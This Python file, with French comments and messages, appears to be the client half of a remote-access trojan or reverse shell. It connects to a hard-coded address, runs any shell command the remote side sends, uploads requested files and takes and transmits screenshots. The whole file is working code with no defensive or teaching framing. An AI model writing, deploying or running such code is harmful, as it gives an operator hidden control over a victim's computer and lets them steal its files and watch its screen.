import socket
import os
import subprocess
import io
from PIL import ImageGrab

def send_data(socket, data):
    """Envoyer des données avec une indication de taille."""
    data = data.encode("utf-8") if isinstance(data, str) else data
    size = len(data)
    socket.sendall(f"SIZE {size}".encode("utf-8"))
    response = socket.recv(1024).decode("utf-8")
    if response == "READY":
        socket.sendall(data)

def receive_data(socket):
    """Recevoir des données avec une taille indiquée."""
    size_message = socket.recv(1024).decode("utf-8")
    if size_message.startswith("SIZE"):
        size = int(size_message.split()[1])
        socket.send("READY".encode("utf-8"))
        data = b""
        while len(data) < size:
            packet = socket.recv(4096)
            if not packet:
                break
            data += packet
        return data.decode("utf-8", errors="ignore")
    return ""

def start_client():
    host = "192.168.1.33"
    port = 12345

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))

    while True:
        try:
            command = receive_data(client_socket)
            if not command:
                break

            if command == "exit":
                break

            elif command.startswith("cd "):
                path = command[3:]
                try:
                    os.chdir(path)
                    send_data(client_socket, f"Répertoire changé : {os.getcwd()}")
                except FileNotFoundError:
                    send_data(client_socket, f"Répertoire introuvable : {path}")

            elif command == "pwd":
                send_data(client_socket, os.getcwd())

            elif command.startswith("download "):
                filepath = command[9:]
                try:
                    with open(filepath, "rb") as f:
                        file_data = f.read()
                        send_data(client_socket, file_data)
                except FileNotFoundError:
                    send_data(client_socket, f"Fichier introuvable : {filepath}")

            elif command == "screenshot":
                try:
                    screenshot = ImageGrab.grab()
                    buffer = io.BytesIO()
                    screenshot.save(buffer, format="PNG")
                    buffer.seek(0)
                    send_data(client_socket, buffer.getvalue())
                except Exception as e:
                    send_data(client_socket, f"Erreur de capture d'écran : {e}")

            else:
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                    send_data(client_socket, output)
                except subprocess.CalledProcessError as e:
                    send_data(client_socket, f"Erreur : {e.output}")

        except Exception as e:
            break

    client_socket.close()

if __name__ == "__main__":
    start_client()
